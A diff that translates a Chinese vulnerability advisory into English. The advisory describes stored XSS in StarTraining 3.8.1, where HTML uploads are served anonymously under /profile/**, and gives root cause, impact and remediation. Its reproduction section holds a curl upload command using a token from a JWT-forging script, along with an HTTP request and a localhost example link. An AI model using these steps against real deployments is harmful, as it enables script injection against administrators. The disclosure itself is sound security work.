@@ -1,42 +1,42 @@
-# StarTraining — 允许上传 HTML 且 /profile/** 匿名访问（存储型 XSS 链） (ST-VULN-006)
+# StarTraining — HTML upload allowed and /profile/** served anonymously (stored XSS) (ST-VULN-006)
 
-| 项 | 内容 |
-|----|------|
+| Field | Value |
+|-------|-------|
 | Vendor | zhistaredu |
-| Product | StarTraining（职星学院） |
+| Product | StarTraining |
 | Version | 3.8.1 |
 | Type | Cross Site Scripting |
 | CWE | CWE-434 / CWE-79 |
-| 认证 | Authenticated user with upload permission |
-| 严重度 | High |
+| Authentication | Authenticated user with upload permission |
+| Severity | High |
 
-## 说明
+## Summary
 
-上传白名单带 html/htm，文件落在 /profile/**，而这条路径匿名可读。上传完直接打开链接就能跑脚本。
+`MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION` includes html/htm. Uploaded files are served under `/profile/**` with permitAll GET.
 
-## 根因
+## Root cause
 
-危险后缀放行 + 静态资源匿名映射。
+Dangerous upload extensions + public static resource mapping.
 
-## 利用链接 / 复现
+## Exploit / reproduction
 
-上传 HTML 后，匿名访问返回的 `/profile/...` 即可触发脚本。
+Upload HTML, then open the returned `/profile/...` URL anonymously.
 
 ```bash
 TOK=$(python3 startraining_jwt_forge.py)
 curl -s -X POST 'http://127.0.0.1:8900/common/upload' -H "Authorization: $TOK" \
   -F 'file=@poc.html;type=text/html'
-# 响应里的 url / fileName 就是下面这种直链
+# Use url / fileName from the JSON response
 ```
 
-示例直链（每次上传 UUID 会变，以响应为准）：
+Example direct link (UUID changes per upload):
 
 - `http://127.0.0.1:8900/profile/upload/2026/08/03/d71ce54a-955f-4057-91dc-35050caed149.html`
 
-静态资源前缀（匿名 GET）：`http://127.0.0.1:8900/profile/**`
+Anonymous static prefix: `http://127.0.0.1:8900/profile/**`
 
 
-## 请求包（Yakit）
+## PoC (Yakit)
 
 ```http
 POST /common/upload HTTP/1.1
@@ -55,23 +55,23 @@ Content-Type: text/html
 # Then open returned /profile/upload/.../poc.html without auth
 ```
 
-期望：上传返回 profile URL；匿名打开后 document.title 变成 XSS_OK。
+Expected: Upload returns profile URL; GET executes script in browser
 
-## 截图
+## Screenshots
 
 ![upload](./screenshots/ST-VULN-006-upload.png)
 
 ![xss](./screenshots/ST-VULN-006-xss.png)
 
-## 影响
+## Impact
 
-管理员点开上传资源就中存储 XSS。
+Stored XSS against admins viewing uploaded resources.
 
-## 修复
+## Remediation
 
-去掉 html；/profile 加鉴权；顺手打开 xss 过滤器。
+Remove html from allowed extensions; require auth on /profile/**; enable XSS filter.
 
-## 关联
+## References
 
-- 本地报告：`../POC_VERIFICATION_REPORT.md`
-- 脚本：`poc_verify/startraining_poc_verify.py` / `startraining_jwt_forge.py`
+- Local report: `../POC_VERIFICATION_REPORT.md`
+- Scripts: `poc_verify/startraining_poc_verify.py`, `startraining_jwt_forge.py`
